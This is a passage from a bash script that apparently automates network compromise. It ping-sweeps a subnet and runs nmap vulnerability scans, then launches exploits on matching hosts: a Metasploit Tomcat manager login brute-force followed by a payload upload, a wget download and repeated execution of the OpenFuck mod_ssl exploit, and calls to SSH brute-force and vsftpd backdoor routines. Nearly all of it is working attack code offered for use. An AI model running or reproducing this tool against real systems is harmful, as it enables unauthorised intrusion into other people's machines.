	ip="$(cat $(dirname $0)/urIp.txt)"
	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
	interface=""
elif [ "$target" != "" ]
then
	echo -e "$target" > $(dirname $0)/online.txt
	ips="$(cat $(dirname $0)/online.txt)"
	target=""
else
	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
	ips="$(cat $(dirname $0)/online.txt)"
fi
echo "Performing a ping sweep is in progress"
echo -e "Your ip address is \e[1m$ip\e[0m"
grep -vxFf $(dirname $0)/urIp.txt $(dirname $0)/online.txt > $(dirname $0)/tmp.txt; cat $(dirname $0)/tmp.txt > $(dirname $0)/online.txt; rm $(dirname $0)/tmp.txt
for ips in $(cat $(dirname $0)/online.txt)
do	
	packets=$(ping -c 1 $ips|grep 64|cut -f1-2 -d' ')
	if [ "$packets" = "64 bytes" ]
	then
		echo -e "\e[1m$ips\e[0m is \e[1;34mOnline\e[0m"
	else
		echo -e "\e[1m$ips\e[0m is \e[1;91mOffline\e[0m"
		sed -i "/$ips/d" $(dirname $0)/online.txt
	fi
	
done
echo "########################################"
for ips in $(cat $(dirname $0)/online.txt)
do
	if [ -d "$ips" ]
	then
		rm -r $ips
	fi
	mkdir $ips
	echo -e "Performing port scan on \e[1m$ips\e[0m"
	if [ "$aggressive" == true ]
	then
		nmap -v0 -sV -n -Pn -p- -T4 -A -O --open --script nmap-vulners,vulscan --script-args vulscandb=exploitdb.csv -oA "$ips"/"$ips" $ips 1> /dev/null
	else
		nmap -v0 -Pn -n -sV -T4 -A -O -oA "$ips"/"$ips" $ips 1> /dev/null
	fi
	echo "PORT	 STATE SERVICE	   VERSION"
	grep "open" $ips/$ips.nmap |sed '1d'

	cat $ips/$ips.xml | grep -oP 'name="\K[^"]+' > $ips/nameTmp.txt
	<$ips/nameTmp.txt awk '!seen[$0]++' >$ips/name.txt; rm $ips/nameTmp.txt
	cat $ips/$ips.xml | grep -oP 'product="\K[^"]+' > $ips/productTmp.txt
	<$ips/productTmp.txt awk '!seen[$0]++' >$ips/product.txt; rm $ips/productTmp.txt
	cat $ips/$ips.xml | grep -oP 'version="\K[^"]+' > $ips/versionTmp.txt
	<$ips/versionTmp.txt awk '!seen[$0]++' >$ips/version.txt; rm $ips/versionTmp.txt
	cat $ips/$ips.xml | grep -oP 'product="Apache/\K[^"]+' > $ips/nameTmp.txt
	<$ips/nameTmp.txt awk '!seen[$0]++' >$ips/Apache.txt; rm $ips/nameTmp.txt
	productOpenfk="$(cat $ips/Apache.txt |cut -f4-4 -d' '|grep -oP '\(\K[^\)]+')"
	operatinS="$(cat $ips/Apache.txt |grep -o '^[^ ]*')"
	ostype="$(cat $ips/$ips.xml | grep -oP 'osfamily="\K[^"]+' |head -1)"
	osgen="$(cat $ips/$ips.xml | grep -oP '<osmatch name="\K[^"]+' |head -1)"
	sleep 10
	if [ "$(grep "netbios-ssn" $ips/name.txt)" = "netbios-ssn" ]
	then
		smbScan
	fi
	if [ "$smbOS" != "ERROR: Script execution failed (use -d to debug)" ] && [ "$smbOS" != "" ]
	then
		echo -e "OS type: \e[1;34m$smbOS\e[0m"
	elif [ "$ostype" != "" ]
	then
		echo -e "OS type: \e[1;34m$ostype: $osgen\e[0m"
	else
		echo -e "OS type: \e[1;34mUnknown\e[0m"
	fi
	echo -e "Performing vulnerability scan on \e[1m$ips\e[0m"
	while read name
	do
		while read product
		do
			while read version
			do
################    SSH       ###################################################################
				if [ "$ostype" = "Linux" ] || [ "$ostype" = "linux" ] || [ "$ostype" = "embedded" ]
				then
					if [ "$name" = "ssh" ] && [ "$product" = "OpenSSH" ] && [ "$version" = "2.9p2" ]
					then
						echo "SSH"
					elif [ "$name" = "ssh" ] && [ "$product" = "OpenSSH" ] && [ "$version" = "3.9p2" ]
					then
						echo "SSH"
					elif [ "$name" = "ssh" ] && [ "$product" = "OpenSSH" ] && [ "$version" = "4.7p1 Debian 8ubuntu1" ]
					then
						OpenSSH4_7p1
					fi
				elif [ "$ostype" = "Windows" ] || [ "$ostype" = "windows" ] || [ "$ostype" = "embedded" ]
				then
					if [ "$name" = "ssh" ] && [ "$product" = "ssh" ] && [ "$version" = "ssh" ]
					then
						echo "SSH"
					elif [ "$name" = "ssh" ] && [ "$product" = "ssh" ] && [ "$version" = "ssh" ]
					then
						echo "SSH"
					fi
				elif [ "$name" = "ssh" ]
				then
					sshBruteForce
				fi
#################    FTP       ####################################################################
				if [ "$name" = "ftp" ] && [ "$product" = "vsftpd" ] && [ "$version" = "2.3.4" ]
				then
					vsftpd_234_backdoor
				fi
################   apache tomcat    ################################################################
				if [ "$name" = "http" ] && [ "$product" = "Apache Tomcat/Coyote JSP engine" ] && [ "$version" = "1.1" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mremote code execution\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					port="$(cat $ips/$ips.nmap | grep "Apache Tomcat/Coyote JSP engine"| cut -f1-1 -d/)"
					if [ -f $(dirname $0)/exploits/apache/tomcat_mgr_login.txt ]
					then
						rm $(dirname $0)/exploits/apache/tomcat_mgr_login.txt
					fi
					cat <<- tomcatScanner > $(dirname $0)/exploits/apache/tomcat_mgr_login.rc
						use auxiliary/scanner/http/tomcat_mgr_login
						set RHOSTS $ips
						set RPORT $port
						spool $(dirname $0)/exploits/apache/tomcat_mgr_login.txt
						run
						exit
					tomcatScanner
					sleep 2
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_login.rc; exit; bash'" 2> /dev/null
					else
						tmux new-window -n tomcat_mgr_login "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_login.rc; exit; bash'" \; 2> /dev/null
					fi
					sleep 30
					user=$(cat $(dirname $0)/exploits/apache/tomcat_mgr_login.txt | grep "[+]" |cut -f6-6 -d' '|cut -f1-1 -d':')
					pass=$(cat $(dirname $0)/exploits/apache/tomcat_mgr_login.txt | grep "[+]" |cut -f6-6 -d' '|cut -f2-2 -d':')
					cat <<- tomcatExploit > $(dirname $0)/exploits/apache/tomcat_mgr_upload.rc
						use exploit/multi/http/tomcat_mgr_upload
						set RHOSTS $ips
						set RPORT $port
						set Httpusername $user
						set Httppassword $pass
						set target 0
						run
					tomcatExploit
					sleep 2
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_upload.rc; bash'" 2> /dev/null
						sleep 10
						description='When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.'
						remediation="See references"
						references="https://nvd.nist.gov/vuln/detail/CVE-2017-12617"
						report2
					else
						tmux new-window -n tomcat "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_upload.rc; read; bash'" \; 2> /dev/null
						sleep 10
						description='When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.'
						remediation="See references"
						references="https://nvd.nist.gov/vuln/detail/CVE-2017-12617"
						report2
					fi
				fi
#############    apache Debian  ####################################################################
				if [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.9" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0c $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0c $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.19" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0d $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0d $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.22" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0e $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0f $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x10 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x11 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0e $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0f $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x10 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x11 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.24" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x12 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x13 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x14 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x12 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x13 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x14 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.26" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x15 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x16 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x15 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x16 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "$productOpenfk" = "Debian/Linux" ] && [ "$version" = "1.3.27" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x17 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x17 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
##########    apache RedHat  ####################################################################
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x47 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x47 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.14" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.14" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4d $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x60 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4d $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x60 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.6.2" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "2.6.2" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.3" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.3" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4c $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4c $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					fi
				elif [ "$name" = "http" ] && [ "$product" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.2.6" ] && [ "$productOpenfk" = "Red-Hat/Linux" ] && [ "$version" = "1.2.6" ]
				then
					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
					then
						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
					fi
					if [ "$tmux" = "bash" ]
					then
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4a $ips -c 41; read; bash'" 2> /dev/null
						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4b $ips -c 41; read; bash'" 2> /dev/null
						sleep 10
						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
						remediation="See references"
						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
						report2
					else
						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4a $ips -c 41; read; bash'" \; 2> /dev/null
						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4b $ips -c 41; read; bash'" \; 2> /dev/null
						sleep 10
